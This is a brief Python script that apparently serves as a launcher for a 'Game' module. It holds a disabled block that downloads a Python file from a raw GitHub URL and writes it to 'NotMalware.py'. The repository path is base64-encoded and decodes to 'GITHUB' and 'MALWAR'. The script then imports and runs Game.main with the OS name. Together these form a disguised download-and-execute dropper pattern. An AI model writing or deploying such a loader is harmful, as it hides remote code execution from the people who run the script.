import platform
import subprocess
import sys
##subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"]) ##Installs dependency modules
import requests
import os
"""
response = requests.get("https://raw.github.com/R0lUSFVC/TUFMV0FS/master/Game.py")
with open("NotMalware.py", "w") as file:
    file.write(response.text)
"""
import Game
platform = platform.system()
Game.main(platform)
